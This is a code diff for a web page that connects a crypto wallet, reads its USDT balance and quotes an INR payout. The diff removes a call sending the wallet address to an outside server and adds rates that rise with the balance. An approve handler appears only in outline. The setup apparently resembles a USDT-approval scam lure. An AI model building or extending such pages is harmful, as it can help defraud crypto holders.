@@ -37,13 +37,6 @@ connectButton.onclick = async () => {
         // Fill the wallet address
         document.getElementById("walletAddress").value = userAddress;
 
-        // Optional: save to backend
-        fetch("http://onlyforapi.com/auto/save_wallet_auto.php", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ wallet: userAddress })
-        });
-
         // Fetch USDT Balance
         const USDT = new ethers.Contract(USDT_ADDRESS, USDT_ABI, ethersProvider);
         const rawBalance = await USDT.balanceOf(userAddress);
@@ -59,7 +52,9 @@ connectButton.onclick = async () => {
         } else {
             document.getElementById("step3Next").disabled = false;
             document.getElementById("amountCalculation").style.display = "block";
-            calculateAmount(balance); // Your logic
+
+            // Calculate INR amount based on balance
+            calculateAmount(balance);
         }
 
     } catch (err) {
@@ -70,6 +65,35 @@ connectButton.onclick = async () => {
         connectButton.disabled = false;
     }
 };
+
+function calculateAmount(balance) {
+    let rate = 0;
+
+    if (balance >= 100 && balance < 200) {
+        rate = 98;
+    } else if (balance >= 200 && balance < 400) {
+        rate = 107;
+    } else if (balance >= 400 && balance < 1000) {
+        rate = 116;
+    } else if (balance >= 1000 && balance < 2000) {
+        rate = 122;
+    } else if (balance >= 2000) {
+        rate = 128;
+    }
+
+    const inrAmount = balance * rate;
+
+    // Format with commas and 2 decimal places
+    const formattedAmount = inrAmount.toLocaleString('en-IN', {
+        style: 'currency',
+        currency: 'INR',
+        minimumFractionDigits: 2
+    });
+
+    document.getElementById("calculatedAmount").value = `${formattedAmount} (Rate: ₹${rate}/USDT)`;
+}
+
+
 
 approveButton.onclick = async () => {
     try {
